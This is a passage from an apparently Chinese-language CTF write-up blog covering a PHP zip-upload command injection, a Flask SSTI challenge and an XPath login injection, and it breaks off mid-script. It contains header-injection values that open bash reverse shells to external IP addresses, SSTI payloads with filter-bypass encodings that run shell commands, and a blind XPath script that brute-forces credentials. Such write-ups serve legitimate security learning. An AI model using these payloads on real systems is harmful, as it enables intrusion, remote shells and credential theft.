alt="beginctfpickleshop"></p><p>现在解题的大致思路就是成功登录后带着<code>cookie</code>点击<code>getpickle</code>，通过修改cookie执行命令。但不知道为啥页面里的<code>login</code>,<code>register</code>点了啥反应都没有。。</p><h3 id="BeginCTF-zupload-pro-plus-max-ultra"><a href="#BeginCTF-zupload-pro-plus-max-ultra" class="headerlink" title="[BeginCTF]zupload-pro-plus-max-ultra"></a>[BeginCTF]zupload-pro-plus-max-ultra</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;./upload&#x27;</span>));<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$file_tmp</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_size</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>];<br>    <span class="hljs-variable">$file_error</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;error&#x27;</span>];<br>    <span class="hljs-variable">$extract_to</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_EXTRACT_TO&#x27;</span>] ?? <span class="hljs-string">&#x27;uploads/&#x27;</span>;<br>    <br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file_name</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$file_ext</span>));<br>    <br>    <span class="hljs-variable">$allowed</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;zip&#x27;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$allowed</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_error</span> === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_size</span> &lt;= <span class="hljs-number">2097152</span>) &#123;<br><br>                <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;unzip &#x27;</span> . <span class="hljs-variable">$file_tmp</span> . <span class="hljs-string">&#x27; -d &#x27;</span> . <span class="hljs-variable">$extract_to</span>);<br><br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>                    <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>,<br>                    <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span>,<br>                    <span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&#x27;/\?/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="hljs-number">0</span>] . <span class="hljs-variable">$file_destination</span><br>                ));<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,<br>            <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;Only zip files are allowed&#x27;</span><br>        ));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>存在命令执行，<code>$extract_to</code>这东西完全可控：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//$extract_to:</span><br><span class="hljs-variable">$extract_to</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_EXTRACT_TO&#x27;</span>] ?? <span class="hljs-string">&#x27;uploads/&#x27;</span>;<br><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;unzip &#x27;</span> . <span class="hljs-variable">$file_tmp</span> . <span class="hljs-string">&#x27; -d &#x27;</span> . <span class="hljs-variable">$extract_to</span>);<br></code></pre></td></tr></table></figure><p>所以抓包增加<code>X-Extract-to</code>头进行命令注入就行?</p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tp"><span class="hljs-keyword">X</span>-EXTRACT-<span class="hljs-keyword">TO</span>: uploads/;bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/43.129.231.32/9001 0&gt;&amp;1&quot;</span><br><span class="hljs-keyword">X</span>-EXTRACT-<span class="hljs-keyword">TO</span>: uploads/&amp;&amp; bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/43.128.40.79/9001 0&gt;&amp;1&quot;</span>;<br><span class="hljs-keyword">X</span>-EXTRACT-<span class="hljs-keyword">TO</span>: uploads/&amp;&amp; cat /flag &gt;/upload/<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>可惜没任何反应🤦‍</p><h2 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h2><p>一个把输入进行一系列编码的网站，给了编码方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">line, key, key2</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(x ^ <span class="hljs-built_in">ord</span>(line[x]) ^ <span class="hljs-built_in">ord</span>(key[::-<span class="hljs-number">1</span>][x]) ^ <span class="hljs-built_in">ord</span>(key2[x])) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(line)))<br><br>app.config[<span class="hljs-string">&#x27;flag&#x27;</span>] = encode(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34&#x27;</span>, <span class="hljs-string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5&#x27;</span>)<br></code></pre></td></tr></table></figure><p>告诉了<code>SSTI</code>和<code>app.config[&#39;flag&#39;]</code>，看看<code>&#123;&#123;config&#125;&#125;</code>:</p><p><img src="/img/paseekactf1.png" alt="paseekactf1"></p><p>解密(使用的异或，所以逆着再加密一次就是解密)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">encoded_line, key, key2</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(encoded_line[x]) ^ <span class="hljs-built_in">ord</span>(key2[x]) ^ <span class="hljs-built_in">ord</span>(key[::-<span class="hljs-number">1</span>][x]) ^ x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encoded_line)))<br><br>encoded_text = <span class="hljs-string">&#x27;-M7\x10wG6o3\x03&quot;b.\x0e\x1b\x0b;\x02(D\x1d\x1a]\x17&#123;8Wh\x02X@\x0b\&#x27;\x01(,\x1c9\x1f\x0fLG&#x27;</span><br>key = <span class="hljs-string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34&#x27;</span><br>key2 = <span class="hljs-string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5&#x27;</span><br>decoded_text = decode(encoded_text, key, key2)<br><span class="hljs-built_in">print</span>(decoded_text)<br></code></pre></td></tr></table></figure><p>运行完发现是乱码。。查了一下才知道给的那个加密算法是错误的，每个靶机不太一样需要读<code>app.py</code>找加密算法：</p><p>过滤了单引号<code>&#39;</code>，<code>.</code>和下划线<code>_</code>：单引号换成双引号；点直接换成<code>[]</code>，下划线用十六进制<code>\x5f</code>：</p><p>因为之前的<code>&#123;&#123;config&#125;&#125;</code>可以用，所以直接拿它:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">&#123;&#123;config<span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;os&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;popen&quot;</span>]</span>(&quot;ls&quot;)<span class="hljs-selector-attr">[<span class="hljs-string">&quot;read&quot;</span>]</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><p>没过滤的话就等于这个东西：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>然后去读<code>app.py</code>，这里的小数点用<code>\x2e</code>替换：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">&#123;&#123;config<span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;os&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;popen&quot;</span>]</span>(&quot;cat app\x2epy&quot;)<span class="hljs-selector-attr">[<span class="hljs-string">&quot;read&quot;</span>]</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#app.py</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template_string, render_template, request<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;folow @osminogka.ann on instagram =)&#x27;</span> <span class="hljs-comment">#在部署时记得删除这部分，以防别人解决了嘿嘿</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">line, key, key2</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(x ^ <span class="hljs-built_in">ord</span>(line[x]) ^ <span class="hljs-built_in">ord</span>(key[::-<span class="hljs-number">1</span>][x]) ^ <span class="hljs-built_in">ord</span>(key2[x])) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(line)))<br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/app/flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <br>flag = file.read()<br>flag = flag[:<span class="hljs-number">42</span>]  <br>app.config[<span class="hljs-string">&#x27;flag&#x27;</span>] = encode(flag, <span class="hljs-string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;</span>, <span class="hljs-string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;</span>)<br>flag = <span class="hljs-string">&quot;&quot;</span>  <br>os.remove(<span class="hljs-string">&quot;/app/flag&quot;</span>)  <br><br>nicknames = [<br>    <span class="hljs-string">&#x27;˜”*°★☆★_%s_★☆★°°*&#x27;</span>, <br>    <span class="hljs-string">&#x27;%s ~♡ⓛⓞⓥⓔ♡~&#x27;</span>, <br>    <span class="hljs-string">&#x27;%s Вêчңø в øĤлâйĤé&#x27;</span>, <br>    <span class="hljs-string">&#x27;♪ ♪ ♪ %s ♪ ♪ ♪ &#x27;</span>, <br>    <span class="hljs-string">&#x27;[♥♥♥%s♥♥♥]&#x27;</span>, <br>    <span class="hljs-string">&#x27;%s, kOтO®Aя )(оТеЛ@ ©4@$tьЯ&#x27;</span>, <br>    <span class="hljs-string">&#x27;♔%s♔&#x27;</span>, <br>    <span class="hljs-string">&#x27;[♂+♂=♥]%s[♂+♂=♥]&#x27;</span><br>]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            p = request.values.get(<span class="hljs-string">&#x27;nickname&#x27;</span>)<br>            <span class="hljs-built_in">id</span> = random.randint(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(nicknames) - <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> p != <span class="hljs-literal">None</span>:<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> p <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;_&#x27;</span> <span class="hljs-keyword">in</span> p <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;\&#x27;&#x27;</span> <span class="hljs-keyword">in</span> p:  <br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Your nickname contains restricted characters!&#x27;</span><br>                <span class="hljs-keyword">return</span> render_template_string(nicknames[<span class="hljs-built_in">id</span>] % p)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Exception&#x27;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">1337</span>)<br></code></pre></td></tr></table></figure><p>然后<code>&#123;&#123;config&#125;&#125;</code>拿加密后的<code>flag</code>，把算法逆着运行一次就行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">encoded_string, key, key2</span>):<br>    decoded = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(x ^ <span class="hljs-built_in">ord</span>(key2[x]) ^ <span class="hljs-built_in">ord</span>(key[::-<span class="hljs-number">1</span>][x]) ^ <span class="hljs-built_in">ord</span>(encoded_string[x])) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encoded_string)))<br>    <span class="hljs-keyword">return</span> decoded<br><br>encoded_text = <span class="hljs-string">&#x27;-M7\x10wI7j0Usgy\x0e\x1cY&gt;U(D\x1dN\x0b\x17x9Rf\x02UGQw\x01(&#123;\x10`\x17\x07\x1eG&#x27;</span><br>key = <span class="hljs-string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;</span><br>key2 = <span class="hljs-string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;</span><br>decoded_text = decode(encoded_text, key, key2)<br><span class="hljs-built_in">print</span>(decoded_text)<br></code></pre></td></tr></table></figure><p>后面看了下其它师傅的wp，还有其它解法(利用get_data这么个玩意儿)：</p><p><a href="https://johnfrod.top/ctf/pasecactf-2019flask_ssti/">参考文章</a></p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs wren">&#123;&#123;()[<span class="hljs-string">&quot;__class__&quot;</span>][<span class="hljs-string">&quot;__bases__&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;__subclasses__&quot;</span>]()[<span class="hljs-number">91</span>][<span class="hljs-string">&quot;get_data&quot;</span>](<span class="hljs-number">0</span>, <span class="hljs-string">&quot;app.py&quot;</span>)&#125;&#125;<br><br>编码后为<br>&#123;&#123;()[<span class="hljs-string">&quot;\u005f\u005f<span class="hljs-char escape_">\u0063</span>\u006c<span class="hljs-char escape_">\u0061</span><span class="hljs-char escape_">\u0073</span><span class="hljs-char escape_">\u0073</span>\u005f\u005f&quot;</span>][<span class="hljs-string">&quot;\u005f\u005f<span class="hljs-char escape_">\u0062</span><span class="hljs-char escape_">\u0061</span><span class="hljs-char escape_">\u0073</span><span class="hljs-char escape_">\u0065</span><span class="hljs-char escape_">\u0073</span>\u005f\u005f&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;\u005f\u005f<span class="hljs-char escape_">\u0073</span><span class="hljs-char escape_">\u0075</span><span class="hljs-char escape_">\u0062</span><span class="hljs-char escape_">\u0063</span>\u006c<span class="hljs-char escape_">\u0061</span><span class="hljs-char escape_">\u0073</span><span class="hljs-char escape_">\u0073</span><span class="hljs-char escape_">\u0065</span><span class="hljs-char escape_">\u0073</span>\u005f\u005f&quot;</span>]()[<span class="hljs-number">91</span>][<span class="hljs-string">&quot;<span class="hljs-char escape_">\u0067</span><span class="hljs-char escape_">\u0065</span><span class="hljs-char escape_">\u0074</span>\u005f<span class="hljs-char escape_">\u0064</span><span class="hljs-char escape_">\u0061</span><span class="hljs-char escape_">\u0074</span><span class="hljs-char escape_">\u0061</span>&quot;</span>](<span class="hljs-number">0</span>, <span class="hljs-string">&quot;app.py&quot;</span>)&#125;&#125;<br><br>或者：<br>&#123;&#123;()[<span class="hljs-string">&quot;<span class="hljs-char escape_">\x5F</span><span class="hljs-char escape_">\x5F</span>class<span class="hljs-char escape_">\x5F</span><span class="hljs-char escape_">\x5F</span>&quot;</span>][<span class="hljs-string">&quot;<span class="hljs-char escape_">\x5F</span><span class="hljs-char escape_">\x5F</span>bases<span class="hljs-char escape_">\x5F</span><span class="hljs-char escape_">\x5F</span>&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;<span class="hljs-char escape_">\x5F</span><span class="hljs-char escape_">\x5F</span>subclasses<span class="hljs-char escape_">\x5F</span><span class="hljs-char escape_">\x5F</span>&quot;</span>]()[<span class="hljs-number">91</span>][<span class="hljs-string">&quot;get<span class="hljs-char escape_">\x5F</span>data&quot;</span>](<span class="hljs-number">0</span>, <span class="hljs-string">&quot;/proc/self/fd/3&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><p><a href="https://xz.aliyun.com/t/7791?time__1311=n4+xnD0G0=I6deGXoo40xmqiKqV4QuwD&alichlgref=https://www.cnblogs.com/#toc-1">Xpath注入</a></p><p><a href="https://www.cnblogs.com/karsa/p/13439673.html">参考文章</a></p><p><img src="/img/xibeiezlogin1.png" alt="xibeiezlogin1"></p><p>抓包可以看到登录时是POST<code>&lt;username&gt;111&lt;/username&gt;&lt;password&gt;111&lt;/password&gt;&lt;token&gt;9b996ad4ab06465f876TcwODkzMzk1My&lt;/token&gt;</code>这种形式的数据。还有就是这个<code>token</code>每次登录就会换一次。</p><p><code>exp:</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>s = requests.session()<br>url =<span class="hljs-string">&#x27;http://479bca59-4dc6-49cd-ad24-a0a971f4d894.node5.buuoj.cn:81//login.php&#x27;</span><br><br><br><br>head =&#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;</span>,<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/xml&quot;</span><br>&#125;<br>find =re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#x27;</span>)<br><br>strs =<span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span><br><br><br>flag =<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:<br><br>        r = s.post(url=url)<br>        token = find.findall(r.text)<br>        <span class="hljs-comment">#猜测根节点名称</span><br>        payload_1 = <span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br>        <span class="hljs-comment">#这里的*[1]表示选择某个节点下的第一个子节点</span><br>        <span class="hljs-comment">#猜测子节点名称</span><br>        payload_2 = <span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><br>        <span class="hljs-comment">#猜测accounts的节点</span><br>        payload_3 =<span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><br>        <span class="hljs-comment">#猜测user节点</span><br>        payload_4 =<span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><br>        <span class="hljs-comment">#跑用户名和密码</span><br>        payload_username =<span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><span class="hljs-comment">#text() 被用来获取特定节点的文本内容</span><br>        payload_password =<span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><br><br>        <span class="hljs-built_in">print</span>(payload_password)<br>        r = s.post(url=url,headers=head,data=payload_username)<br>        <span class="hljs-built_in">print</span>(r.text)<br><br><br>        <span 